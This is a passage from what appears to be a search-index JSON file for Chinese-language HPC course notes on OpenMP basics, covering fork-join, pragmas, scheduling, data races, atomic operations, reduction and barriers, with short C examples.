\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u56db\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u4ef6 HPC Tutorial - OpenMP tutorial \uff0c \u4e2d\u6587\u6559\u7a0b OpenMP official tutorials OpenMP \u7b80\u4ecb \u00b6 OpenMP\u7684\u9002\u7528\u8303\u56f4\uff1a\u591a\u7ebf\u7a0b\u3001\u5171\u4eab\u5185\u5b58 \u5171\u4eab\u5b58\u50a8\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e00\u4e2a\u5e76\u884c\u7f16\u7a0b\u6a21\u578b \u9002\u7528\u4e8e SMP\uff08Symmetric Multi-Processor\uff09\u5171\u4eab\u5185\u5b58\u591a\u5904\u7406\u7cfb\u7edf\u548c\u591a\u6838\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784 \u4e09\u7c7b\u4e3b\u8981 API\uff08\u8868\u73b0\u4e3a\u7f16\u8bd1\u5236\u5bfc\u6307\u4ee4\uff0c\u4f46\u5b9e\u9645\u4e0a\u4ecd\u4e3aAPI\uff09\uff1a\u7f16\u8bd1\u5668\u6307\u4ee4\u3001\u8fd0\u884c\u65f6\u5e93\u51fd\u6570\u3001\u73af\u5883\u53d8\u91cf \u4f20\u7edf\u4e0a\uff0c\u6211\u4eec\u5229\u7528 OpenMP \u8fdb\u884c\u5355\u673a\u5668 CPU \u4f18\u5316\uff08\u53ef\u8de8\u5904\u7406\u5668\uff09\uff0c\u4e0d\u8fc7\u5728\u8f83\u65b0\u7684 OpenMP \u7248\u672c\u7684\u4e2d\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 OpenMP \u5c06\u4ee3\u7801\u4f18\u5316\u5230 GPU \u7b49\u5f02\u6784\u8ba1\u7b97\u8bbe\u5907\u4e0a OpenMP \u7f16\u7a0b\u6a21\u578b \u00b6 \u91c7\u7528\u5171\u4eab\u5185\u5b58\u6a21\u578b \u7531\u4e8e\u662f\u5171\u4eab\u5185\u5b58\u67b6\u6784\uff0c\u5f80\u5f80\u53ea\u80fd\u5c06 omp \u5e94\u7528\u5728\u5355\u8282\u70b9\u4e0a HPC\u4e2d\u5f80\u5f80\u662f\u56db\u673a\u96c6\u7fa4\u7684\u914d\u7f6e\uff0c\u4e0d\u540c\u673a\u5668\u4e4b\u95f4\u901a\u8fc7 MPI \u4e0e OMP \u76f8\u7ed3\u5408\u5b9e\u73b0\u5206\u5e03\u5f0f\u5185\u5b58\u5e76\u884c\uff0c \u6df7\u5408\u5e76\u884c\u7f16\u7a0b OMP \u7528\u4e8e\u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u8fdb\u884c\u8ba1\u7b97\u5bc6\u96c6\u578b\u5de5\u4f5c MPI \u7528\u4e8e\u4e0d\u540c\u8282\u70b9\u4e4b\u95f4\u7684\u901a\u4fe1\u548c\u6570\u636e\u5171\u4eab \u5e76\u884c\u6027 \u00b6 \u51e0\u4e2a\u6982\u5ff5\uff1a \u8fdb\u7a0b \uff1a\u5e76\u53d1\u6267\u884c\u7684\u7a0b\u5e8f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5206\u914d\u548c\u7ba1\u7406\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d\uff08\u52a8\u6001\u7684\uff09\uff0c\u4f5c\u4e3a\u7ade\u4e89\u8ba1\u7b97\u673a\u7cfb\u7edf\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d \u7ebf\u7a0b \uff1a\u8fdb\u7a0b\u7684\u4e00\u4e2a\u6267\u884c\u5355\u5143\uff08\u72ec\u7acb\u8fd0\u884c\uff09\uff0c\u8fdb\u7a0b\u7684\u5185\u6838\u8c03\u5ea6\u5b9e\u4f53\uff08\u201c\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\u201d\uff09 \u534f\u7a0b \uff1a\u6bd4\u7ebf\u7a0b\u66f4\u8f7b\u91cf\u7ea7\u7684\u5b58\u5728\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u6709\u591a\u4e2a\u534f\u7a0b\uff08\u7c7b\u4f3c\u4e8e\u4e0d\u5e26\u8fd4\u56de\u503c\u7684\u5b50\u51fd\u6570\uff09 \u5173\u4e8e\u7ebf\u7a0b\u548c\u8fdb\u7a0b\uff1a \u8fdb\u7a0b\u4e4b\u95f4\u5730\u5740\u7a7a\u95f4\u4e3a\u72ec\u7acb\uff08CPU\u4fdd\u62a4\u6a21\u5f0f\uff09\uff1b\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u672c\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff08IO\uff0cCPU\uff0c\u5185\u5b58\u4ea6\u5982\u662f\uff09 \u8fdb\u7a0b\u7684\u7a0b\u5e8f\u5165\u53e3\u6267\u884c\u5f00\u9500\u5927\uff0c\u5f53\u8981\u8fdb\u884c\u9891\u7e41\u5207\u6362\u65f6\uff0c\u4f7f\u7528\u7ebf\u7a0b\u597d\u4e8e\u4f7f\u7528\u8fdb\u7a0b \u7531\u4e8e\u5730\u5740\u7a7a\u95f4\u7b49\u8d44\u6e90\u9694\u79bb\uff0c\u591a\u8fdb\u7a0b\u65f6\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6302\u6389\u5e76\u4e0d\u4f1a\u5bfc\u81f4\u6574\u4e2a\u4efb\u52a1\u6302\u6389 \u5982\u679c\u8981\u6c42\u540c\u65f6\u8fdb\u884c\u5e76\u4e14\u53c8\u8981\u5171\u4eab\u67d0\u4e9b\u53d8\u91cf\u7684\u5e76\u53d1\u64cd\u4f5c\uff0c\u53ea\u80fd\u7528\u7ebf\u7a0b\u4e0d\u80fd\u7528\u8fdb\u7a0b Fork-Join \u6a21\u578b \u00b6 OpenMP \u7684\u5e76\u884c\u53ea\u4f7f\u7528 Fork-Join \u4e00\u79cd\u6a21\u578b OpenMP \u7a0b\u5e8f\u5f00\u59cb\u4e8e\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u6309\u7167\u987a\u5e8f\u6267\u884c\uff0c\u76f4\u5230\u9047\u5230\u7b2c\u4e00\u4e2a\u5e76\u884c\u5757 fork\uff1a\u4e3b\u7ebf\u7a0b\u521b\u5efa\u4e00\u7ec4\u5e76\u884c\u7ebf\u7a0b join\uff1a\u5f53\u56e2\u961f\u7ebf\u7a0b\u5b8c\u6210\u5e76\u884c\u5757\u4e2d\u7684\u8bed\u53e5\u65f6\uff0c\u5b83\u4eec\u5c06\u8fdb\u884c\u540c\u6b65\u5e76\u7ec8\u6b62\uff0c\u53ea\u7559\u4e0b\u4e3b\u7ebf\u7a0b \u5e76\u884c\u5757\u7684\u6570\u91cf\u548c\u7ec4\u6210\u5b83\u4eec\u7684\u7ebf\u7a0b\u662f\u4efb\u610f\u7684 OpenMP API \u7b80\u4ecb \u00b6 \u8fd0\u884c\u65f6\u51fd\u6570\u5e93\u4e0e\u73af\u5883\u53d8\u91cf \u00b6 \u4f7f\u7528\u65f6\u8981 #include <omp.h> \uff0c\u4e00\u4e9b\u5e38\u7528\u51fd\u6570\uff1a int omp_get_thread_num () \uff1a\u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u53f7 int omp_get_num_threads () \uff1a\u83b7\u53d6\u603b\u7ebf\u7a0b\u6570 double omp_get_wtime () \uff1a\u83b7\u53d6\u65f6\u95f4\uff0c\u5e38\u7528\u4e8e\u8ba1\u7b97\u7ebf\u7a0b\u5185\u8bed\u53e5\u6267\u884c\u65f6\u95f4 OpenMP \u4f1a\u8bfb\u53d6\u73af\u5883\u53d8\u91cf OMP_NUM_THREADS \u6765\u51b3\u5b9a\u521b\u5efa\u7684\u7ebf\u7a0b\u6570 \u5e38\u89c1\u5236\u5bfc\u8bed\u53e5 \u00b6 \u4e5f\u5c31\u662f\u7f16\u8bd1\u5668\u6307\u4ee4\uff0c\u4e00\u4e9b\u5e38\u7528\u7684\uff1a #pragma omp parallel \uff1a\u521b\u5efa\u5e76\u884c\u5757 #pragma omp for \uff1a\u5e76\u884c\u5316 for \u5faa\u73af #pragma omp master \uff1a\u53ea\u6709\u4e3b\u7ebf\u7a0b\u6267\u884c #pragma omp single \uff1a\u4ec5\u6709\u56e2\u961f\u4e2d\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c #pragma omp sections \uff1a\u5185\u90e8\u4f7f\u7528 section \u6307\u5b9a\u4e0d\u540c\u7ebf\u7a0b\u8fd0\u884c\u7684\u5185\u5bb9 #pragma omp barrier \uff1a\u540c\u6b65\u56e2\u961f\u4e2d\u6240\u6709\u7ebf\u7a0b #pragma omp atomic \uff1a\u539f\u5b50\u65b9\u5f0f\u8bbf\u95ee\u5185\u5b58 OpenMP \u7f16\u7a0b \u00b6 \u7ebf\u7a0b\u5e76\u884c \u00b6 \u4f7f\u7528 #pragma omp parallel \u521b\u5efa\u5e76\u884c\u5757\u6765\u5e76\u884c\u8fd0\u884c\u540c\u4e00\u6bb5\u7a0b\u5e8f\uff1a #include <omp.h> #include <stdio.h> #include <stdlib.h> int main () { #pragma omp parallel { int ID = omp_get_thread_num (); printf ( \"thread #%d \\n \" , ID ); } } \u6b64\u65f6\u5c06\u6839\u636e OMP_NUM_THREADS \u7684\u503c\u6765\u8bbe\u5b9a\u7ebf\u7a0b\u6570\uff0c\u51e0\u70b9\u6ce8\u610f\uff1a \u8fd0\u884c\u65f6\u8f93\u51fa\u7684\u987a\u5e8f\u662f\u4e0d\u4e00\u5b9a\u7684 #pragma \u8bed\u53e5\u540e\u9762\u4e0d\u80fd\u7d27\u8ddf\u7740\u5927\u62ec\u53f7\uff0c\u4e00\u5b9a\u8981\u6362\u4e00\u884c \u53ef\u4ee5\u901a\u8fc7\u5728 parallel \u540e\u9762\u52a0 num_threads( xx ) \u6765\u6307\u5b9a\u7279\u5b9a\u7ebf\u7a0b\u6570 for \u5faa\u73af\u5e76\u884c \u00b6 parallel \u5757\u5185\u53ef\u4ee5\u4f7f\u7528 #pragma omp for \u6765\u5bf9 for \u5faa\u73af\u8fdb\u884c\u5e76\u884c\uff0c\u76f8\u5f53\u4e8e\u5c06\u5faa\u73af\u62c6\u6210\u4e0d\u540c\u90e8\u5206\u5206\u914d\u7ed9\u591a\u4e2a\u7ebf\u7a0b #pragma omp parallel { #pragma omp for { for ( int i = 0 ; i < N ; ++ i ) { c [ i ] = a [ i ] + b [ i ]; } } } for \u5faa\u73af\u4e2d\u4e0d\u80fd\u5305\u542b break\uff08\u4f1a\u62a5\u9519\uff09\uff0c\u4e14\u5fc5\u987b\u5305\u542b \"int i = xxx \" parallel \u548c for \u53ef\u4ee5\u5408\u8d77\u6765\u5199\u4f5c\u4e00\u884c #pragma omp parallel for \u6761\u4ef6\u5e76\u884c \u00b6 \u53ef\u4ee5\u5728\u5236\u5bfc\u8bed\u53e5\u540e\u9762\u52a0 if \u5b50\u53e5\u6765\u51b3\u5b9a\u662f\u5426\u8fdb\u884c\u5e76\u884c\uff1a #pragma omp parallel if(x) num_threads(4) { ... } \u5982\u679c x \u4e0d\u4e3a 0 \u5219\u5206\u4e3a\u56db\u4e2a\u7ebf\u7a0b\u6267\u884c\u5757\u5185\u5185\u5bb9 \u5982\u679c x \u4e3a 0 \u5219\u7531\u4e3b\u7ebf\u7a0b\u4e32\u884c\u6267\u884c sections \u4e0e single \u00b6 sections \u7528\u4e8e\u5c06\u5de5\u4f5c\u62c6\u5206\u4e3a\u82e5\u5e72\u90e8\u5206\uff0c\u6bcf\u90e8\u5206\u5206\u522b\u7531\u4e0d\u540c\u7ebf\u7a0b\u8fdb\u884c\uff0c\u5b9e\u73b0\u201c\u51fd\u6570\u5e76\u884c\u5316\u201d #pragma omp parallel sections { #pragma omp section printf ( \"%d %d \\n \" , omp_get_num_threads (), omp_get_thread_num ()); #pragma omp section printf ( \"%d %d \\n \" , omp_get_num_threads (), omp_get_thread_num ()); } \u6b64\u4ee3\u7801\u7684\u4e24\u4e2a printf \u5c06\u5206\u5230\u4e24\u4e2a\u7ebf\u7a0b\u4e2d\u5206\u522b\u6267\u884c \u9664\u975e\u4f7f\u7528\u4e86 nowait\uff0c\u5426\u5219\u9ed8\u8ba4 sections \u4e3a barrier\uff08\u7ebf\u7a0b\u4e4b\u95f4\u4f1a\u4e92\u76f8\u7b49\u5f85\uff09 single \u7528\u6765\u5e8f\u5217\u5316\u4e00\u6bb5\u4ee3\u7801\uff0c\u5373\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6267\u884c\uff08\u5904\u7406\u975e\u7ebf\u7a0b\u5b89\u5168\u7684\u4ee3\u7801\uff0c\u4f8b\u5982 IO\uff09 \u4efb\u52a1\u8c03\u5ea6 \u00b6 OpenMP \u4e2d\u4efb\u52a1\u8c03\u5ea6\u4e3b\u8981\u7528\u4e8e\u5e76\u884c\u7684 for \u5faa\u73af\uff0c\u5f53\u5faa\u73af\u4e2d\u6bcf\u6b21\u8fed\u4ee3\u7684\u8ba1\u7b97\u91cf\u4e0d\u76f8\u7b49\u65f6\uff0c\u4f1a\u9020\u6210\u67d0\u4e9b\u7ebf\u7a0b\u7a7a\u95f2\uff0c\u6ca1\u6709\u4f7f\u6027\u80fd\u6700\u5927\u5316 OpenMP \u7684\u4efb\u52a1\u8c03\u5ea6\u65b9\u5f0f\u6709\u4e09\u79cd\uff1astatic\u3001dynamic\u3001guide\uff0c\u4f7f\u7528 schedule \u5b50\u53e5\u6307\u5b9a\uff1a static \uff1a\u9ed8\u8ba4\u60c5\u51b5\uff0c\u76f4\u63a5\u6309\u7167\u8fed\u4ee3\u6b21\u6570\u5206\u914d dynamic \uff1a\u5c06\u4efb\u52a1\u5206\u914d\u5230\u6bcf\u4e2a\u6838\u5fc3\uff0c\u6709\u6838\u5fc3\u7a7a\u95f2\u4e86\u5c31\u63a5\u7740\u5206\u914d\u3002\u5982\u679c\u6307\u5b9a size \u4e3a 2 \u5c31\u4f1a\u6bcf\u4e00\u6b21\u4e3a\u6bcf\u4e00\u4e2a\u6838\u5fc3\u8fde\u7eed\u5206\u914d\u4e24\u4e2a\u4efb\u52a1 #pragma omp parallel for num_threads(4) schedule(dynamic, 2) for ( int i = 0 ; i < 10 ; ++ i ) { ... } guided \uff1a\u91c7\u7528\u6307\u5bfc\u6027\u7684\u542f\u53d1\u5f0f\u81ea\u8c03\u5ea6\u65b9\u5f0f\u3002\u5f00\u59cb\u65f6\u6bcf\u4e2a\u7ebf\u7a0b\u4f1a\u5206\u914d\u5230\u8f83\u5927\u7684\u8fed\u4ee3\u5757\uff0c\u4e4b\u540e\u5206\u914d\u5230\u7684\u8fed\u4ee3\u5757\u4f1a\u9010\u6e10\u9012\u51cf\uff0c\u6309\u6307\u6570\u7ea7\u4e0b\u964d\u5230\u6307\u5b9a\u7684 size \u5927\u5c0f\uff0c\u6ca1\u6709\u6307\u5b9a size \u5219\u4f1a\u4e0b\u964d\u5230 1 #pragma omp parallel for num_threads(4) schedule(guided, 2) for ( int i = 0 ; i < 100 ; ++ i ) { ... } \u6570\u636e\u5192\u9669 \u00b6 OpenMP \u4e2d\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u7684 Local Memory\uff0c\u4f46\u9ed8\u8ba4\u4e0a\u5e76\u884c\u5757\u5916\u7684\u53d8\u91cf\u90fd\u662f\u5171\u4eab\u7684\uff0c\u5171\u4eab\u7684\u5b58\u50a8\u5728\u7ebf\u7a0b\u4e2d\u540c\u65f6\u8bfb\u5199\u65f6\u4f1a\u51fa\u73b0\u95ee\u9898 \u53d8\u91cf\u79c1\u6709 \u00b6 \u53ef\u4ee5\u5229\u7528 private \u5b50\u53e5\u6765\u58f0\u660e x \u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u79c1\u6709\u7684\u53d8\u91cf\uff1a int x ; #pragma omp parallel for private(x) for ( int i = 0 ; i < 100 ; ++ i ) { x = array [ i ]; array [ i ] = work ( x ); } \u6b64\u65f6\u5bf9\u4e8e x \u7684\u8bbf\u95ee\u5c31\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81 \u4f46\u5728\u7a0b\u5e8f\u4e2d\u5e94\u8be5\u5047\u5b9a\u6bcf\u4e2a\u7ebf\u7a0b\u5185\u7684 x \u90fd\u6ca1\u6709\u88ab\u521d\u59cb\u5316\uff08\u5373\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d x \u6700\u5f00\u59cb\u90fd\u662f\u968f\u673a\u7684\uff09 \u4e5f\u6709 shared(x) \u5b50\u53e5\uff0c\u8fd9\u56de\u4f7f\u6240\u6709\u7ebf\u7a0b\u8bbf\u95ee\u540c\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4 x \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u5e76\u884c\u5757\u5185\u58f0\u660e \u53ef\u4ee5\u5229\u7528 firstprivate \u548c lastprivate \u5b50\u53e5\u6765\u5b9e\u73b0\u81ea\u52a8\u521d\u59cb\u5316 \u539f\u5b50\u64cd\u4f5c \u00b6 \u591a\u4e2a\u7ebf\u7a0b\u5728\u76f8\u8fd1\u7684\u65f6\u95f4\u6bb5\u5185\u5bf9\u5171\u4eab\u7684\u53d8\u91cf\u8fdb\u884c\u66f4\u65b0\uff0c\u5c31\u4f1a\u4ea7\u751f\u6570\u636e\u4e0d\u4e00\u81f4\u7684\u95ee\u9898 \u539f\u5b50\u64cd\u4f5c\u53ef\u4ee5\u4fdd\u8bc1\u66f4\u65b0\u64cd\u4f5c\u4e0d\u53ef\u518d\u5206 \u4f8b\u5982\uff1a int counter = 0 ; #pragma omp parallel num_threads(4) shared(counter) { for ( int i = 0 ; i < 1000000 ; ++ i ) { counter += 1 ; } } \u8fd9\u65f6\u6240\u6709\u7ebf\u7a0b\u90fd\u4f1a\u5bf9 counter \u8fdb\u884c\u8bfb\u5199\uff0c\u4f1a\u9020\u6210\u7ade\u4e89\uff0c\u53ef\u80fd\u5bfc\u81f4\u6700\u7ec8\u7684\u7ed3\u679c\u4e0d\u6b63\u786e \u5728 counter += 1 \u4e00\u884c\u4e0a\u9762\u52a0\u4e0a #pragma omp atomic \u53ef\u4ee5\u4f7f\u8fd9\u5355\u4e2a\u8bed\u53e5\u5728\u6c47\u7f16\u5c42\u9762\u4e0a\u539f\u5b50\u5316\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u201c\u52a0\u9501\u201d\u4e86\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u9020\u6210\u8bfb\u5199\u7684\u51b2\u7a81 reduction \u00b6 reduction \u5b50\u53e5\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u521b\u5efa\u5e76\u79c1\u6709\u5316\u6307\u5b9a\u53d8\u91cf\u7684\u79c1\u6709\u526f\u672c\uff0c\u7136\u540e\u5728\u5e76\u884c\u7ed3\u675f\u4e4b\u540e\u5c06\u4e0d\u540c\u7ebf\u7a0b\u7684\u7ed3\u679c\u5408\u5e76\u4e3a\u4e00\u4e2a\uff0c\u4f8b\u5982\uff1a int sum = 0 ; #pragma omp parallel for reduction(+: sum) for ( int i = 0 ; i < 1000 ; ++ i ) { sum += 1 ; } barrier \u00b6 \u6bcf\u4e2a\u5e76\u884c\u5757\u90fd\u542b\u6709\u9690\u5f0f\u7684 barrier\uff0c\u4e5f\u5c31\u662f\u5728\u6240\u6709\u7ebf\u7a0b\u90fd\u7ed3\u675f\u540e\u624d\u80fd\u7ee7\u7eed\u5411\u4e0b\u8fd0\u884c \u5728\u5e76\u884c\u5757\u5185\u4e5f\u53ef\u4ee5\u5229\u7528 #pragma omp barrier \u6765\u540c\u6b65\u5404\u7ebf\u7a0b\uff0c\u5373\u6240\u6709\u7ebf\u7a0b\u90fd\u89e6\u78b0\u5230 barrier \u65f6\u518d\u7ee7\u7eed \u53ef\u4ee5\u5229\u7528 nowait \u5b50\u53e5\u6765\u53d6\u6d88\u5e76\u884c\u5757\u7ed3\u5c3e\u7684\u9690\u5f0f barrier\uff0c\u907f\u514d\u540c\u6b65\u4ea7\u751f\u7684\u5f00\u9500","title":"OpenMP \u57fa\u7840"},{"location":"hpc/hpc101/openmp/#openmp","text":"Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u56db\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u4ef6 HPC Tutorial - OpenMP tutorial \uff0c \u4e2d\u6587\u6559\u7a0b OpenMP official tutorials","title":"OpenMP \u57fa\u7840"},{"location":"hpc/hpc101/openmp/#openmp_1","text":"OpenMP\u7684\u9002\u7528\u8303\u56f4\uff1a\u591a\u7ebf\u7a0b\u3001\u5171\u4eab\u5185\u5b58 \u5171\u4eab\u5b58\u50a8\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e00\u4e2a\u5e76\u884c\u7f16\u7a0b\u6a21\u578b \u9002\u7528\u4e8e SMP\uff08Symmetric Multi-Processor\uff09\u5171\u4eab\u5185\u5b58\u591a\u5904\u7406\u7cfb\u7edf\u548c\u591a\u6838\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784 \u4e09\u7c7b\u4e3b\u8981 API\uff08\u8868\u73b0\u4e3a\u7f16\u8bd1\u5236\u5bfc\u6307\u4ee4\uff0c\u4f46\u5b9e\u9645\u4e0a\u4ecd\u4e3aAPI\uff09\uff1a\u7f16\u8bd1\u5668\u6307\u4ee4\u3001\u8fd0\u884c\u65f6\u5e93\u51fd\u6570\u3001\u73af\u5883\u53d8\u91cf \u4f20\u7edf\u4e0a\uff0c\u6211\u4eec\u5229\u7528 OpenMP \u8fdb\u884c\u5355\u673a\u5668 CPU \u4f18\u5316\uff08\u53ef\u8de8\u5904\u7406\u5668\uff09\uff0c\u4e0d\u8fc7\u5728\u8f83\u65b0\u7684 OpenMP \u7248\u672c\u7684\u4e2d\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 OpenMP \u5c06\u4ee3\u7801\u4f18\u5316\u5230 GPU \u7b49\u5f02\u6784\u8ba1\u7b97\u8bbe\u5907\u4e0a","title":"OpenMP \u7b80\u4ecb"},{"location":"hpc/hpc101/openmp/#openmp_2","text":"\u91c7\u7528\u5171\u4eab\u5185\u5b58\u6a21\u578b \u7531\u4e8e\u662f\u5171\u4eab\u5185\u5b58\u67b6\u6784\uff0c\u5f80\u5f80\u53ea\u80fd\u5c06 omp \u5e94\u7528\u5728\u5355\u8282\u70b9\u4e0a HPC\u4e2d\u5f80\u5f80\u662f\u56db\u673a\u96c6\u7fa4\u7684\u914d\u7f6e\uff0c\u4e0d\u540c\u673a\u5668\u4e4b\u95f4\u901a\u8fc7 MPI \u4e0e OMP \u76f8\u7ed3\u5408\u5b9e\u73b0\u5206\u5e03\u5f0f\u5185\u5b58\u5e76\u884c\uff0c \u6df7\u5408\u5e76\u884c\u7f16\u7a0b OMP \u7528\u4e8e\u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u8fdb\u884c\u8ba1\u7b97\u5bc6\u96c6\u578b\u5de5\u4f5c MPI \u7528\u4e8e\u4e0d\u540c\u8282\u70b9\u4e4b\u95f4\u7684\u901a\u4fe1\u548c\u6570\u636e\u5171\u4eab","title":"OpenMP \u7f16\u7a0b\u6a21\u578b"},{"location":"hpc/hpc101/openmp/#_1","text":"\u51e0\u4e2a\u6982\u5ff5\uff1a \u8fdb\u7a0b \uff1a\u5e76\u53d1\u6267\u884c\u7684\u7a0b\u5e8f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5206\u914d\u548c\u7ba1\u7406\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d\uff08\u52a8\u6001\u7684\uff09\uff0c\u4f5c\u4e3a\u7ade\u4e89\u8ba1\u7b97\u673a\u7cfb\u7edf\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d \u7ebf\u7a0b \uff1a\u8fdb\u7a0b\u7684\u4e00\u4e2a\u6267\u884c\u5355\u5143\uff08\u72ec\u7acb\u8fd0\u884c\uff09\uff0c\u8fdb\u7a0b\u7684\u5185\u6838\u8c03\u5ea6\u5b9e\u4f53\uff08\u201c\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\u201d\uff09 \u534f\u7a0b \uff1a\u6bd4\u7ebf\u7a0b\u66f4\u8f7b\u91cf\u7ea7\u7684\u5b58\u5728\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u6709\u591a\u4e2a\u534f\u7a0b\uff08\u7c7b\u4f3c\u4e8e\u4e0d\u5e26\u8fd4\u56de\u503c\u7684\u5b50\u51fd\u6570\uff09 \u5173\u4e8e\u7ebf\u7a0b\u548c\u8fdb\u7a0b\uff1a \u8fdb\u7a0b\u4e4b\u95f4\u5730\u5740\u7a7a\u95f4\u4e3a\u72ec\u7acb\uff08CPU\u4fdd\u62a4\u6a21\u5f0f\uff09\uff1b\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u672c\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff08IO\uff0cCPU\uff0c\u5185\u5b58\u4ea6\u5982\u662f\uff09 \u8fdb\u7a0b\u7684\u7a0b\u5e8f\u5165\u53e3\u6267\u884c\u5f00\u9500\u5927\uff0c\u5f53\u8981\u8fdb\u884c\u9891\u7e41\u5207\u6362\u65f6\uff0c\u4f7f\u7528\u7ebf\u7a0b\u597d\u4e8e\u4f7f\u7528\u8fdb\u7a0b \u7531\u4e8e\u5730\u5740\u7a7a\u95f4\u7b49\u8d44\u6e90\u9694\u79bb\uff0c\u591a\u8fdb\u7a0b\u65f6\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6302\u6389\u5e76\u4e0d\u4f1a\u5bfc\u81f4\u6574\u4e2a\u4efb\u52a1\u6302\u6389 \u5982\u679c\u8981\u6c42\u540c\u65f6\u8fdb\u884c\u5e76\u4e14\u53c8\u8981\u5171\u4eab\u67d0\u4e9b\u53d8\u91cf\u7684\u5e76\u53d1\u64cd\u4f5c\uff0c\u53ea\u80fd\u7528\u7ebf\u7a0b\u4e0d\u80fd\u7528\u8fdb\u7a0b","title":"\u5e76\u884c\u6027"},{"location":"hpc/hpc101/openmp/#fork-join","text":"OpenMP \u7684\u5e76\u884c\u53ea\u4f7f\u7528 Fork-Join \u4e00\u79cd\u6a21\u578b OpenMP \u7a0b\u5e8f\u5f00\u59cb\u4e8e\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u6309\u7167\u987a\u5e8f\u6267\u884c\uff0c\u76f4\u5230\u9047\u5230\u7b2c\u4e00\u4e2a\u5e76\u884c\u5757 fork\uff1a\u4e3b\u7ebf\u7a0b\u521b\u5efa\u4e00\u7ec4\u5e76\u884c\u7ebf\u7a0b join\uff1a\u5f53\u56e2\u961f\u7ebf\u7a0b\u5b8c\u6210\u5e76\u884c\u5757\u4e2d\u7684\u8bed\u53e5\u65f6\uff0c\u5b83\u4eec\u5c06\u8fdb\u884c\u540c\u6b65\u5e76\u7ec8\u6b62\uff0c\u53ea\u7559\u4e0b\u4e3b\u7ebf\u7a0b \u5e76\u884c\u5757\u7684\u6570\u91cf\u548c\u7ec4\u6210\u5b83\u4eec\u7684\u7ebf\u7a0b\u662f\u4efb\u610f\u7684","title":"Fork-Join \u6a21\u578b"},{"location":"hpc/hpc101/openmp/#openmp-api","text":"","title":"OpenMP API \u7b80\u4ecb"},{"location":"hpc/hpc101/openmp/#_2","text":"\u4f7f\u7528\u65f6\u8981 #include <omp.h> \uff0c\u4e00\u4e9b\u5e38\u7528\u51fd\u6570\uff1a int omp_get_thread_num () \uff1a\u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u53f7 int omp_get_num_threads () \uff1a\u83b7\u53d6\u603b\u7ebf\u7a0b\u6570 double omp_get_wtime () \uff1a\u83b7\u53d6\u65f6\u95f4\uff0c\u5e38\u7528\u4e8e\u8ba1\u7b97\u7ebf\u7a0b\u5185\u8bed\u53e5\u6267\u884c\u65f6\u95f4 OpenMP \u4f1a\u8bfb\u53d6\u73af\u5883\u53d8\u91cf OMP_NUM_THREADS \u6765\u51b3\u5b9a\u521b\u5efa\u7684\u7ebf\u7a0b\u6570","title":"\u8fd0\u884c\u65f6\u51fd\u6570\u5e93\u4e0e\u73af\u5883\u53d8\u91cf"},{"location":"hpc/hpc101/openmp/#_3","text":"\u4e5f\u5c31\u662f\u7f16\u8bd1\u5668\u6307\u4ee4\uff0c\u4e00\u4e9b\u5e38\u7528\u7684\uff1a #pragma omp parallel \uff1a\u521b\u5efa\u5e76\u884c\u5757 #pragma omp for \uff1a\u5e76\u884c\u5316 for \u5faa\u73af #pragma omp master \uff1a\u53ea\u6709\u4e3b\u7ebf\u7a0b\u6267\u884c #pragma omp single \uff1a\u4ec5\u6709\u56e2\u961f\u4e2d\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c #pragma omp sections \uff1a\u5185\u90e8\u4f7f\u7528 section \u6307\u5b9a\u4e0d\u540c\u7ebf\u7a0b\u8fd0\u884c\u7684\u5185\u5bb9 #pragma omp barrier \uff1a\u540c\u6b65\u56e2\u961f\u4e2d\u6240\u6709\u7ebf\u7a0b #pragma omp atomic 